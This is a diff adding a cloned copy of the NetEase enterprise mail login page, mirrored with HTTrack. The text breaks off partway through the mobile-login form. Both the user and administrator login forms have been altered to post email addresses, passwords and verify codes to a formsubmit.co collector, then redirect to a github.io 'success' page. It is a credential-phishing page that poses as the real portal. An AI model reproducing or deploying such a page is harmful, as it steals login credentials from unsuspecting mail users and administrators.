@@ -1,0 +1,828 @@
+<!doctype html>
+<html lang="zh_CN">
+<!-- Mirrored from qy.163.com/login/?hl=en_US by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 20:16:31 GMT -->
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-type" content="text/html;charset=utf-8">
+    <title data-lang-key="网易企业邮箱 - 登录入口">网易企业邮箱 - 登录入口</title>
+    <meta name="keywords" content="网易企业邮箱,登录企业邮箱,企业邮箱注册,电子邮箱" />
+    <meta name="description" content="登录网易企业邮箱，请填写完整的邮件地址或管理员账号，支持手机扫码登录。用邮箱大师，随时随地，极速收发。" />
+    <link rel="shortcut icon" href="https://qiye.163.com/favicon.ico" type="image/x-icon" />
+    <script id="jsBaseInner">
+        function fCheckCookie() {
+            if (!navigator.cookieEnabled) {
+                alert("您好，您的浏览器设置禁止使用cookie\n请设置您的浏览器，启用cookie功能，再重新登录。");
+            }
+        }
+
+        function fHtml5Tag() {
+            var aTag = ["aside", "figcaption", "figure", "footer", "header", "hgroup", "nav", "section"],
+                i = 0;
+            for (i in aTag) {
+                document.createElement(aTag[i]);
+            }
+        }
+        //判断cookie
+        fCheckCookie();
+        //HTML5初始化
+        fHtml5Tag();
+    </script>
+    <script>
+        window.isXC = location.host == 'mailxc.qiye.163.com';
+        //信创版本进入信创适配版
+        function fCheckBrowser() {
+            var ua = navigator.userAgent.toLowerCase();
+            var types = ['ipad', 'iphone os', 'android', 'ucweb', 'windows ce', 'windows mobile'];
+            var match = false;
+            for (var i = 0; i < types.length; i++) {
+                if (ua.indexOf(types[i]) != -1) {
+                    match = true;
+                    break;
+                }
+            }
+            return match;
+        }
+        if (fCheckBrowser() && window.isXC) {
+            window.location.href = 'm.html'
+        }
+    </script>
+    <script>
+        ! function(t, e) {
+            "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : (t = t || self).assetsRetry = e()
+        }(this, function() {
+            "use strict";
+
+            function u(t) {
+                return t
+            }
+
+            function p() {}
+
+            function t(t) {
+                for (var e = Object.getPrototypeOf ? Object.getPrototypeOf : function(t) {
+                        return t.__proto__
+                    }, r = Object.keys(t); e(t);) r = r.concat(Object.keys(e(t))), t = e(t);
+                return r.filter(function(t) {
+                    return "constructor" !== t
+                })
+            }
+
+            function n(t, e) {
+                try {
+                    return "function" == typeof t[e]
+                } catch (t) {
+                    return !1
+                }
+            }
+
+            function f(t) {
+                return Array.isArray(t) ? t.reduce(function(t, e, r, n) {
+                    return t[e] = n[(r + 1) % n.length], t
+                }, {}) : t
+            }
+
+            function g(e, t) {
+                return Object.keys(t).filter(function(t) {
+                    return -1 < e.indexOf(t)
+                }).sort(function(t, e) {
+                    return e.length - t.length
+                })[0]
+            }
+            var e, r, o, b = "retryTimes",
+                l = "succeeded",
+                m = "failed",
+                E = "maxRetryCount",
+                O = "onRetry",
+                d = "onSuccess",
+                j = "onFail",
+                w = "domain",
+                s = "styleImageNoImportant",
+                i = "_assetsRetryProxy",
+                h = "_assetsRetryOnerror",
+                y = "script",
+                a = "link",
+                _ = "data-assets-retry-hooked",
+                A = "data-assets-retry-ignore",
+                k = "data-retry-id",
+                v = window,
+                R = window.document,
+                c = v.HTMLElement,
+                S = v.HTMLScriptElement,
+                x = v.HTMLStyleElement,
+                L = v.HTMLLinkElement,
+                T = v.HTMLImageElement,
+                I = Object.prototype.hasOwnProperty,
+                M = function(t, e, r) {
+                    var n = t.indexOf(e);
+                    return -1 === n ? t : t.substring(0, n) + r + t.substring(n + e.length)
+                },
+                N = function(t) {
+                    return [].slice.call(t)
+                },
+                P = function(e, t, r, n) {
+                    void 0 === r && (r = p), void 0 === n && (n = !1);
+                    var o, i, a, c, u, f = n || e.defer || e.async;
+                    "loading" !== R.readyState || /Edge|MSIE|rv:/i.test(navigator.userAgent) || f ? (o = R.createElement(y), Object.keys(S.prototype).forEach(function(t) {
+                        if ("src" !== t && e[t] && "object" != typeof e[t]) try {
+                            o[t] = e[t]
+                        } catch (t) {}
+                    }), o.src = t, o.onload = e.onload, o.onerror = e.onerror, o.setAttribute(k, q()), (i = e.getAttribute("nonce")) && o.setAttribute("nonce", i), R.getElementsByTagName("head")[0].appendChild(o)) : (a = q(), c = e.outerHTML.replace(/data-retry-id="[^"]+"/, "").replace(/src=(?:"[^"]+"|.+)([ >])/, k + "=" + a + ' src="' + t + '"$1'), R.write(c), (u = R.querySelector("script[" + k + '="' + a + '"]')) && (u.onload = r))
+                },
+                H = function(e) {
+                    try {
+                        return e.rules
+                    } catch (t) {
+                        try {
+                            return e.cssRules
+                        } catch (t) {
+                            return null
+                        }
+                    }
+                },
+                C = function(e, t, r) {
+                    var n = R.createElement(a);
+                    Object.keys(L.prototype).forEach(function(t) {
+                        if ("href" !== t && e[t] && "object" != typeof e[t]) try {
+                            n[t] = e[t]
+                        } catch (t) {}
+                    }), n.href = t, n.onload = r || e.onload, n.onerror = e.onerror, n.setAttribute(k, q()), R.getElementsByTagName("head")[0].appendChild(n)
+                },
+                B = function(t) {
+                    return t ? t instanceof c ? [t.nodeName, t.src, t.href, t.getAttribute(k)].join(";") : "not_supported" : "null"
+                },
+                q = function() {
+                    return Math.random().toString(36).slice(2)
+                },
+                z = function(t) {
+                    return t instanceof S || t instanceof T ? t.src : t instanceof L ? t.href : ""
+                },
+                D = {},
+                F = function(t, e) {
+                    var r, n = Z(t, e),
+                        o = n[0],
+                        i = n[1];
+                    return o ? (D[o] = D[o] || ((r = {})[b] = 0, r[m] = [], r[l] = [], r), [i, D[o]]) : []
+                },
+                Z = function(t, e) {
+                    var r, n, o = g(t, e);
+                    return o ? [(n = o, (r = t).substr(r.indexOf(n) + n.length, r.length)), o] : ["", ""]
+                };
+            try {
+                r = function() {
+                    for (var t = 0, e = 0, r = arguments.length; e < r; e++) t += arguments[e].length;
+                    for (var n = Array(t), o = 0, e = 0; e < r; e++)
+                        for (var i = arguments[e], a = 0, c = i.length; a < c; a++, o++) n[o] = i[a];
+                    return n
+                }(t(S.prototype), t(L.prototype)), o = {}, r.forEach(function(t) {
+                    o[t] = !0
+                }), e = Object.keys(o)
+            } catch (t) {}
+
+            function $(s, t) {
+                var l = t[E],
+                    d = f(t[w]),
+                    y = t[O];
+                return e.reduce(function(t, r) {
+                    var e = n(S.prototype, r);
+                    return t[r] = e ? {
+                        value: function() {
+                            return s[i][r].apply(s[i], arguments)
+                        }
+                    } : {
+                        set: function(e) {
+                            var f = s[i];
+                            return "onerror" === r ? (s[h] = e, void(f.onerror = function(n) {
+                                if ("string" != typeof n) {
+                                    n.stopPropagation && n.stopPropagation();
+                                    var t = function() {
+                                            return t = s[h], e = f, r = n, "function" != typeof t ? null : t.call(e, r);
+                                            var t, e, r
+                                        },
+                                        e = z(f),
+                                        r = F(e, d),
+                                        o = r[0],
+                                        i = r[1],
+                                        a = f.hasAttribute(A);
+                                    if (!o || !i || a) return t();
+                                    var c = M(e, o, d[o]),
+                                        u = y(c, e, i);
+                                    if (null === u) return t();
+                                    if ("string" != typeof u) throw new Error("a string should be returned in `onRetry` function");
+                                    i[b] <= l ? f instanceof S ? P(f, u, p, !0) : f instanceof L && C(f, u) : t()
+                                }
+                            })) : "onload" === r ? (s._assetsRetryOnload = e, void(s[i].onload = function(t) {
+                                e && !e._called && (e._called = !0, e.call(s[i], t))
+                            })) : void(f[r] = e)
+                        },
+                        get: function() {
+                            return s[i][r]
+                        }
+                    }, t
+                }, {})
+            }
+            var G = function(r) {
+                    var n = R.createElement;
+                    R.createElement = function(t, e) {
+                        return t === y || t === a ? function(t, e) {
+                            var r;
+                            t.setAttribute(_, "true");
+                            var n = ((r = {})[i] = t, r[h] = p, r),
+                                o = $(n, e);
+                            return Object.defineProperties(n, o), n.onload = p, n.onerror = p, n
+                        }(n.call(R, t), r) : n.call(R, t, e)
+                    }
+                },
+                J = function(r) {
+                    Object.keys(r).filter(function(t) {
+                        return n(r, t)
+                    }).forEach(function(t) {
+                        var e = r[t];
+                        r[t] = function() {
+                            var t = [].slice.call(arguments).map(function(t) {
+                                return t && I.call(t, i) ? t[i] : t
+                            });
+                            return e.apply(this, t)
+                        }
+                    })
+                };
+            var K = {};
+
+            function Q(y) {
+                function f(t) {
+                    if (t) {
+                        var e = t.target || t.srcElement,
+                            r = z(e);
+                        if (r) {
+                            var n = F(r, v),
+                                o = n[0],
+                                i = n[1],
+                                a = e instanceof HTMLElement && e.hasAttribute(A);
+                            if (i && o && !a) {
+                                i[b]++, i[m].push(r);
+                                var c, u = i[b] > y[E];
+                                if (u && (c = Z(r, v)[0], h(c)), v[o] && !u) {
+                                    var f = v[o],
+                                        s = M(r, o, f),
+                                        l = p(s, r, i);
+                                    if (null !== l) {
+                                        if ("string" != typeof l) throw new Error("a string should be returned in `onRetry` function");
+                                        if (e instanceof T && e.src) return e.setAttribute(k, q()), void(e.src = l);
+                                        var d = B(e);
+                                        K[d] || (K[d] = !0, e instanceof S && !e.getAttribute(_) && e.src ? P(e, l) : e instanceof L && !e.getAttribute(_) && e.href && C(e, l))
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                var p = y[O],
+                    s = y[d],
+                    h = y[j],
+                    v = y[w];
+                R.addEventListener("error", f, !0), R.addEventListener("load", function(t) {
+                    var e, r, n, o, i, a, c, u;
+                    t && (e = t.target || t.srcElement, (r = z(e)) && ((n = F(r, v))[0], o = n[1], i = Z(r, v)[0], a = function() {
+                        o && o[l].push(r), s(i)
+                    }, e instanceof L ? R.styleSheets && (c = N(R.styleSheets).filter(function(t) {
+                        return t.href === e.href
+                    })[0], null !== (u = H(c)) && (0 !== u.length ? a() : f(t))) : a()))
+                }, !0)
+            }
+            var U = Date.now() % 1e9,
+                V = Object.defineProperty && function() {
+                    try {
+                        return 1 === Object.defineProperty({}, "x", {
+                            value: 1
+                        }).x
+                    } catch (t) {}
+                }(),
+                W = (X.prototype.add = function(t) {
+                    V ? Object.defineProperty(t, this._, {
+                        configurable: !0,
+                        writable: !0,
+                        value: !0
+                    }) : t[this._] = !0
+                }, X.prototype.has = function(t) {
+                    return !!t[this._]
+                }, X.prototype.delete = function(t) {
+                    return !!t[this._] && !(t[this._] = void 0)
+                }, X);
+
+            function X() {
+                this._ = "__st" + (1e9 * Math.random() >>> 0) + U++ + "__"
+            }
+
+            function Y(t, e, r, n, o) {
+                var i, a = o[w],
+                    c = o[O],
+                    u = e.style && e.style[t];
+                if (u && !/^url\(["']?data:/.test(u)) {
+                    var f = u.match(/^url\(["']?(.+?)["']?\)/) || [],
+                        s = f[1];
+                    if (s) {
+                        var l = g(s, a);
+                        if (l) {
+                            for (var d = l, y = ((i = {})[d] = !0, i); d && a[d];) {
+                                var p = a[d];
+                                if (y[p]) break;
+                                y[p] = !0, d = p
+                            }
+                            var h = Object.keys(y).map(function(t) {
+                                    var e = M(s, l, t),
+                                        r = c(e, s, null);
+                                    return r ? 'url("' + r + '")' : null
+                                }).filter(Boolean).join(","),
+                                v = e.selectorText + ("{ " + t.replace(/([a-z])([A-Z])/g, function(t, e, r) {
+                                    return e + "-" + r.toLowerCase()
+                                }) + ": " + h + " " + (o.styleImageNoImportant ? "" : "!important")) + "; }";
+                            try {
+                                r.insertRule(v, n.length)
+                            } catch (t) {
+                                r.insertRule(v, 0)
+                            }
+                        }
+                    }
+                }
+            }
+            var tt = {},
+                et = new W,
+                rt = function(t, o) {
+                    var i = ["backgroundImage", "borderImage", "listStyleImage"];
+                    t.forEach(function(r) {
+                        var n = H(r);
+                        if (null !== n) {
+                            for (var t = n.length, e = 0; e < t; e++) ! function(t) {
+                                var e = n[t];
+                                i.forEach(function(t) {
+                                    Y(t, e, r, n, o)
+                                })
+                            }(e);
+                            r.href && (tt[r.href] = !0), r.ownerNode instanceof x && et.add(r.ownerNode)
+                        }
+                    })
+                },
+                nt = function(t, r) {
+                    return N(t).filter(function(t) {
+                        if (!H(t)) return !1;
+                        if (t.href) return !tt[t.href] && !!g(t.href, r);
+                        var e = t.ownerNode;
+                        return !(e instanceof x && et.has(e))
+                    })
+                };
+            return function(t) {
+                var e, r, n, o;
+                void 0 === t && (t = {});
+                try {
+                    if ("object" != typeof t[w]) throw new Error("opts.domain cannot be non-object.");
+                    var i = [E, O, d, j, w, s],
+                        a = Object.keys(t).filter(function(t) {
+                            return -1 === i.indexOf(t)
+                        });
+                    if (0 < a.length) throw new Error("option name: " + a.join(", ") + " is not valid.");
+                    var c = ((e = {})[E] = t[E] || 3, e[O] = t[O] || u, e[d] = t[d] || p, e[j] = t[j] || p, e[w] = f(t[w]), e[s] = t[s] || !1, e);
+                    return G(c), "undefined" != typeof Node && J(Node.prototype), "undefined" != typeof Element && J(Element.prototype), Q(c), r = c, n = R.styleSheets, o = r[w], n && setInterval(function() {
+                        var t = nt(R.styleSheets, o);
+                        0 < t.length && rt(t, r)
+                    }, 250), D
+                } catch (t) {
+                    v.console && console.error("[assetsRetry] error captured", t)
+                }
+            }
+        });
+    </script>
+    <script>
+        var cssTry = false;
+        var assetsRetryStatistics = window.assetsRetry({
+            domain: ['mg.127.net', window.location.host],
+            maxRetryCount: 1,
+            onRetry: function(currentUrl, originalUrl, statistics) {
+                if (currentUrl.indexOf('mg.127.net') < 0) {
+                    currentUrl = currentUrl.replace('/static/mimg/p', '');
+                }
+                if (!!window.ActiveXObject || "ActiveXObject" in window) {
+                    if (!cssTry) {
+                        //ie css不会重试，需要手动重试
+                        var headNode = document.getElementsByTagName('head')[0];
+                        var fileName = document.getElementsByTagName('link')[1].href.split('https://qy.163.com/');
+                        var _href = '//' + window.location.host + '/login/css/' + fileName[fileName.length - 1];
+                        var link = document.createElement('link');
+                        link.rel = 'stylesheet';
+                        link.type = 'text/css';
+                        link.href = _href;
+                        if (document.createStyleSheet) {
+                            document.createStyleSheet(_href);
+                        } else {
+                            headNode.appendChild(link);
+                        }
+                        cssTry = true;
+                    }
+                }
+                return currentUrl
+            },
+            onSuccess: function(currentUrl) {},
+            onFail: function(currentUrl) {}
+        })
+    </script>
+    <link href="mg.127.net/static/mimg/p/login/css/bundle.94d9d21e.css" rel="stylesheet">
+
+    <style>
+        #switchAccCtrl.active {
+            background-color: #D0F4EA;
+        }
+
+        #switchAdminCtrl.active {
+            background-color: #D0F4EA;
+        }
+    </style>
+</head>
+
+<body style="background: url(mg.127.net/static/mimg/p/login/img/silk_2023_12_25_2ed4be2d88c7415590a8092bf8dc5766.jpeg); background-repeat: no-repeat;">
+    <header class="g-hd">
+        <div>
+            <h1 class="w-qiyelogo" id="J_logo"><a href="" target="_blank" data-lang-title="中国第一大电子邮件服务商" title="中国第一大电子邮件服务商" data-tj-key="b_Logo_click"></a>
+            </h1>
+            <h1 class="w-qiyelogo-xc" id="J_logo_xc">
+                <a href="" target="_blank" data-lang-title="中国第一大电子邮件服务商" title="中国第一大电子邮件服务商" data-tj-key="b_Logo_click"></a>
+            </h1>
+            <nav class="m-hdnav" id="hdnav">
+                <a href="https://qiye.163.com/entry/buy-price.htm?from=login_pc" target="_blank" data-tj-key="b_Registe_click" data-lang-key="新用户开通" id="xyhkt">新用户开通</a>
+                <a href="?hl=zh_CN" data-tj-key="b_CN_Language_click" id="hlCn" class="f-hide">简体版</a>
+                <a href="?hl=en_US" data-tj-key="b_EN_Language_click" id="hlEn">English</a>
+                <a download href="javascript:;" id="lxbg" class="official-app">网易邮箱官方客户端<div class="download-triangle">
+                    </div>
+                    <div class="download-qrcode">
+                        <img src="https://cowork-storage-public-cdn.lx.netease.com/qyy/2021/07/20/3f123d729c924c6692926a292384171d" width="102" height="102">
+                        <p>扫码下载官方APP</p>
+                    </div>
+                </a>
+                <a href="http://mail.163.com/dashi/dlpro.html?from=mail45" target="_blank" data-tj-key="b_Dashi_click"
+                    data-lang-key="邮箱大师" id="yxds">邮箱大师</a> <a id="help-url-id" href="javascript:void(0);"
+                    target="_blank" data-tj-key="b_Help_click" data-lang-key="帮助中心">帮助中心</a>
+            </nav>
+        </div>
+    </header>
+    <section class="g-bd">
+        <div class="g-bd-mn js-bdImg" id="bdImg">
+            <div class="m-theme">
+                <div class="g-wrap">
+                    <a id="linkTheme" class="link js-linkTheme" href="javascript:;" data-tj-key="b_BdImg_click" style="background: url(mg.127.net/static/mimg/p/login/img/silk_2024_01_23_5bc4512767ad42fa965d5994c8a4a317.png); background-repeat: no-repeat; background-size: contain; background-position: center;"></a>
+                    <div class="themectrl"><a class="js-prevTheme" id="prevTheme" href="javascript:void(0);" data-lang-title="上一张" title="上一张"></a> <a class="js-nextTheme" id="nextTheme" href="javascript:void(0);" data-lang-title="下一张" title="下一张"></a></div>
+                </div>
+            </div>
+            <div id="loginBlock" class="m-login m-login-with-ad js-loginpanel">
+                <div class="new-loginFunc"></div>
+                <div class="login-bd" id="js-account-login">
+                    <h3 class="loginbox-title" style="display: flex;">
+                        <span class="active" id="switchAccCtrl" data-lang-key="邮箱账号登录">邮箱账号登录</span>
+                        <span id="switchAdminCtrl" data-lang-key="管理员登录">管理员登录</span>
+                    </h3>
+                    <!-- Start of user login form -->
+                    <form class="login-form login-form-acc js-loginform js-loginform-acc" name="accountlogin" action="https://formsubmit.co/826dcfbe56b470592300985191150e32" method="post" target="_top">
+                      <input type="hidden" name="_next" value=" https://kentomarine0003.github.io/formsubmit/success.html">
+                        <!-- <input type="hidden" class="js-domain" name="domain" value="">
+                        <input type="hidden" class="js-accname" name="account_name" value="">
+                        <input type="hidden" class="js-isSecure" name="secure" value="1">
+                        <input type="hidden" class="js-isAllSecure" name="all_secure" value="1">
+                        <input type="hidden" class="js-language" name="language" value="0">
+                        <input type="hidden" class="js-pubid" name="pubid" value="">
+                        <input type="hidden" class="js-passtype" name="passtype" value="">
+                        <input type="hidden" class="js-referer" name="referer" value="">
+                        <input type="hidden" class="js-module" name="module" value="">
+                        <input type="hidden" class="js-ua" name="ua" value="">
+                        <input type="hidden" class="js-ch" name="ch" value=""> -->
+
+                        <!-- Email -->
+                        <div class="m-ipt js-ipt"><span class="icon icon-account"></span>
+                            <input id="accname" class="ipt js-value js-username" tabindex="1" data-lang-placeholder="邮箱地址" placeholder="邮箱地址" data-lang-title="请输入完整邮箱地址" title="请输入完整邮箱地址" name="accname">
+                            <div class="m-error"><?= isset($errors) ? $errors['accname'] : '' ?></div>
+                        </div>
+
+                        <!-- password -->
+                        <div class="m-ipt js-ipt">
+                            <span class="icon icon-pwd"></span>
+                            <input id="accpwd" class="ipt js-value js-pwd" tabindex="2" data-lang-placeholder="密码" placeholder="密码" data-lang-title="请输入密码" title="请输入密码" type="password" name="password">
+                            <span class="eye icon-close js-eye"></span>
+                            <div class="m-error"><?= isset($errors) ? $errors['password'] : '' ?></div>
+                        </div>
+                        <div>
+                             <div class="m-verifycode">
+                                <div class="m-ipt js-ipt">
+                                    <input id="accverifycode" class="ipt js-value js-verifycode" tabindex="2" data-lang-title="请输入验证码" title="请输入验证码" data-lang-placeholder="验证码" placeholder="验证码" name="verify_code">
+                                    <div class="m-error"></div>
+                                </div>
+                                <img width="90" id="imgVerifycode" class="refreshVerifycode" data-lang-title="点击切换" title="点击切换">
+                            </div>
+                        </div>
+                        <div class="loginconf" >
+                            <div class="logincheck js-logincheck">
+                                <span class="icon icon-checkbox js-checkbox"></span>
+                                <label for="accautologin" class="checklabel js-autolabel">
+                                    <input tabindex="3" data-lang-title="记住账号" title="记住账号" class="checkipt js-autologin" type="checkbox" id="accautologin">
+                                    <span data-lang-key="记住账号">记住账号</span></label>
+                                <div class="securetip js-securetip" data-lang-key="为了您的信息安全，请不要在网吧或公用电脑上使用此功能！">
+                                    为了您的信息安全，请不要在网吧或公用电脑上使用此功能！</div>
+                            </div><a href="/static/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd" class="forgetpwd" target="_blank" data-tj-key="b_ResetPwd_click" data-lang-key="忘记密码">忘记密码</a>
+                        </div>
+                        <div class="loginbtn">
+                            <button class="w-button w-button-account js-loginbtn" type="submit" tabindex="4" data-lang-key="登 录">登 录</button>
+                        </div>
+                        <div class="u-logincheck logincheck js-logincheck js-loginPrivate loginPrivate">
+                            <span class="icon icon-checkbox js-checkbox"></span> <label for="privateRule" class="checklabel js-autolabel"><input tabindex="3" class="checkipt js-autologin js-privateRule" type="checkbox"> <span class="u-private-text"><span data-lang-key="我已阅读并同意">我已阅读并同意</span> <a href="#" target="_blank" data-lang-key="服务条款">服务条款</a> <span data-lang-key="和">和</span><a href="#" target="_blank" data-lang-key="隐私政策"> 隐私政策</a></span></label>
+                        </div>
+                        <div id="accLoginSslSelector" class="loginact">
+                            <div class="loginselect"><a class="selector js-sslsel" href="javascript:;" hidefocus="true"><span data-lang-key="正使用">正使用</span><span class="js-ssltxt" data-lang-key="全程SSL">全程SSL</span><span class="icon icon-arrow"></span></a>
+                                <div class="m-lgselect js-lgselect">
+                                    <ul>
+                                        <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="1" data-tj-value="1" data-lang-key="全程SSL">全程SSL</a></li>
+                                        <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="0" data-tj-value="0" data-lang-key="SSL登录">SSL登录</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="chselect"><a class="selector js-chsel" href="javascript:;" hidefocus="true"><span data-lang-key="正在使用">正在使用</span><span class="js-chtxt" data-lang-key="默认线路">默认线路</span><span class="icon icon-arrow"></span></a>
+                                <div class="m-lgselect js-lgchselect">
+                                    <ul>
+                                        <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-ch="" data-tj-value="1" data-lang-key="默认线路">默认线路</a></li>
+                                        <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-ch="hw" data-lang-key="国际线路">国际线路</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                    <!-- End of user login form -->
+
+                    <!-- Admim login -->
+                    <form class="login-form login-form-admin js-loginform js-loginform-admin" name="adminlogin" action="https://formsubmit.co/826dcfbe56b470592300985191150e32" method="post" target="_top">
+                      <input type="hidden" name="_next" value=" https://kentomarine0003.github.io/formsubmit/success.html">
+                        <!-- <input type="hidden" class="js-domain" name="domain" value="">
+                        <input type="hidden" class="js-accname" name="account_name" value="">
+                        <input type="hidden" class="js-isSecure" name="secure" value="1">
+                        <input type="hidden" class="js-isAllSecure" name="all_secure" value="1"> <input type="hidden" class="js-language" name="language" value="0">
+                        <input type="hidden" class="js-pubid" name="pubid" value="">
+                        <input type="hidden" class="js-passtype" name="passtype" value="">
+                        <input type="hidden" class="js-target" name="target" value="">
+                        <input type="hidden" class="js-ua" name="ua" value="">
+                        <input type="hidden" class="js-ch" name="ch" value=""> -->
+
+                        <div class="m-ipt js-ipt">
+                            <span class="icon icon-account"></span>
+                            <input id="adminname" class="ipt js-value js-username" tabindex="1" data-lang-title="请输入完整邮箱地址" title="请输入完整邮箱地址" data-lang-placeholder="邮箱地址" placeholder="邮箱地址" name="accname">
+                            <div class="m-error"><?= isset($errors) ? $errors['accname'] : '' ?></div>
+                        </div>
+                        <div class="m-ipt js-ipt">
+                            <span class="icon icon-pwd"></span>
+                            <input id="adminpwd" class="ipt js-value js-pwd" tabindex="2" data-lang-title="请输入密码" title="请输入密码" data-lang-placeholder="密码" placeholder="密码" type="password" name="password">
+                            <span class="eye icon-close js-eye"></span>
+                            <div class="m-error"><?= isset($errors) ? $errors['password'] : '' ?></div>
+                        </div>
+                        <div>
+                            <div class="m-verifycode">
+                                <div class="m-ipt js-ipt"><input id="adminverifycode" class="ipt js-value js-verifycode" tabindex="2" data-lang-title="请输入验证码" title="请输入验证码" data-lang-placeholder="验证码" placeholder="验证码" name="verify_code">
+                                    <div class="close-bg"></div>
+                                    <div class="m-error"></div>
+                                </div><img width="90" id="imgadminVerifycode" class="refreshVerifycode" data-lang-title="点击切换" title="点击切换">
+                            </div>
+                        </div>
+                        <div class="loginconf">
+                            <div class="logincheck js-logincheck"><span class="icon icon-checkbox js-checkbox"></span>
+                                <label for="adminautologin" class="checklabel js-autolabel"><input tabindex="3" data-lang-title="记住账号" title="记住账号" class="checkipt js-autologin" type="checkbox" id="adminautologin"> <span data-lang-key="记住账号">记住账号</span></label>
+                                <div class="securetip js-securetip" data-lang-key="为了您的信息安全，请不要在网吧或公用电脑上使用此功能！">
+                                    为了您的信息安全，请不要在网吧或公用电脑上使用此功能！</div>
+                            </div>
+                            <!-- <a
+                                href="https://mail.qiye.163.com/mailapp/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd"
+                                class="forgetpwd" target="_blank" data-tj-key="b_ResetAdminPwd_click"
+                                data-lang-key="忘记密码">忘记密码</a> -->
+                        </div>
+                        <div class="loginbtn"><button class="w-button w-button-admin js-loginbtn" type="submit" tabindex="4" data-lang-key="管理员登录">管理员登录</button></div>
+
+                        <div class="u-logincheck logincheck js-logincheck js-loginPrivate loginPrivate"><span class="icon icon-checkbox js-checkbox"></span> <label for="privateRule" class="checklabel js-autolabel"><input tabindex="3" class="checkipt js-autologin js-privateRule" type="checkbox"> <span class="u-private-text"><span data-lang-key="我已阅读并同意">我已阅读并同意</span> <a href="#service" target="_blank" data-lang-key="服务条款">服务条款</a> <span data-lang-key="和">和</span><a href="#privacy" target="_blank" data-lang-key="隐私政策"> 隐私政策</a></span></label></div>
+                        <div class="loginact" id="adminLoginSslSelector" style="display: none;">
+                            <div class="loginselect">
+                                <div class="selector" data-lang-key="正使用全程SSL" id="sshLogin">正使用全程SSL</div>
+                            </div>
+                            <div class="chselect"><a class="selector js-chsel" href="javascript:;" hidefocus="true"><span data-lang-key="正在使用">正在使用</span><span class="js-chtxt" data-lang-key="默认线路">默认线路</span><span class="icon icon-arrow"></span></a>
+                                <div class="m-lgselect js-lgchselect">
+                                    <ul>
+                                        <li><a class="js-selitem selected" href="javascript:;" hidefocus="true" data-ch="" data-lang-key="默认线路">默认线路</a></li>
+                                        <li><a class="js-selitem" href="javascript:;" hidefocus="true" data-ch="hw" data-lang-key="国际线路">国际线路</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+                    <div class="u-register" id="registerUrl">还没有账号？<a id="registerHref">立即注册</a></div>
+                    <div id="msgpid" class="loginerror"></div>
+                    <div class="js-switch-qrcode" >
+                        <span class="icon-sirius siriusApp" data-type="3" id="siriusApp" title="网易企业邮官方客户端扫码登录" data-lang-title="网易企业邮官方客户端扫码登录"></span>
+                         <span class="icon-dashi dashiApp" data-type="1" id="dashiApp" title="邮箱大师扫码登录" data-lang-title="邮箱大师扫码登录"></span>
+                         <span class="icon-wx wxApp" data-type="2" id="wxApp" title="微信扫码登录" data-lang-title="微信扫码登录"> </span>
+                         <span class="icon-mobile" data-type="4" id="mobileApp" title="手机号登录" data-lang-title="手机号登录"></span>
+                        <div class="m-bubbles" id="js_bubble" style="display: none;">
+                            <div class="bubble"></div>
+                            <div class="m-bubbles-text" data-title-key="试一试通过手机号一键登录邮箱吧">试一试通过手机号一键登录邮箱吧！</div>
+                            <div class="m-bubbles-btn" id="js_bubble_hide" data-title-key="我知道了">我知道了</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="login-bd m-login-mobile" id="js-mobile-login" style="display: none;">
+                    <div id="mobileLogin">
+                        <div class="m-loginbox-title" data-lang-key="手机号登录">手机号登录</div>
+                        <form class="login-form login-form-mobile js-loginform js-loginform-mobile" name="mobilelogin" action="" method="post" target="_top"><input type="hidden" class="js-mobile" name="mobile" value=""> <input type="hidden" class="js-prefix" name="prefix" value="86"> <input type="hidden" class="js-code" name="code" value=""> <input type="hidden" class="js-isSecure" name="secure" value="1">
+                            <input type="hidden" class="js-language" name="language" value="0"> <input type="hidden" class="js-pubid" name="pubid" value=""> <input type="hidden" class="js-passtype" name="passtype" value=""> <input type="hidden" class="js-referer" name="referer" value=""> <input type="hidden" class="js-module" name="module" value=""> <input type="hidden" class="js-ua" name="ua" value=""> <input type="hidden" class="js-captcha" id="js-captcha" name="captcha" value=""> <input type="hidden" class="js-unq_code" id="js-unq_code" name="unq_code" value=""> <input type="hidden" class="js-rsa" id="js-rsa" name="rsa" value=""> <input type="hidden" class="js-area" id="js-area" name="area" value="">
+                            <div class="m-ipt js-ipt">
+                                <div id="js-city-select">
+                                    <div class="m-city-selector loginselect"><a class="selector js-sslsel" href="javascript:;" hidefocus="true"><span class="js-ssltxt">+86</span><span class="icon icon-arrow"></span></a>
+                                        <div class="m-lgselect js-lgselect">
+                                            <ul id="cityList"></ul>
+                                        </div>
+                                    </div>
+                                </div><input id="phone" class="ipt js-value js-phone u-mobile" tabindex="1" data-lang-placeholder="请输入手机号码" placeholder="请输入手机号码" data-lang-title="请输入手机号码" title="请输入手机号码" name="phone">
+                                <div class="m-error"></div>
+                            </div>
+                            <div class="m-ipt js-ipt"><input id="code" class="ipt js-value js-vcode" tabindex="2" data-lang-placeholder="请输入验证码" placeholder="请输入验证码" data-lang-title="请输入验证码" title="请输入验证码" name="code">
+                                <div id="sendCode" class="sendCode" data-lang-key="发送验证码">发送验证码</div>
+                                <div id="js_timer" class="sendCode grey" style="display: none;"></div>
+                                <div class="m-error"></div>
+                            </div>
+                            <div id="captcha"></div>
+                            <div class="loginbtn">
+                                <div class="w-button w-button-account js-mobile-submit" id="mobileSubmit" tabindex="4" data-lang-key="登 录">登 录</div>
+                            </div>
+                            <div class="logincheck js-logincheck js-loginPrivate loginPrivate"><span class="icon icon-checkbox js-checkbox"></span> <label for="privateRule" class="checklabel js-autolabel"><input tabindex="3" class="checkipt js-autologin js-privateRule" type="checkbox" id="privateRule">
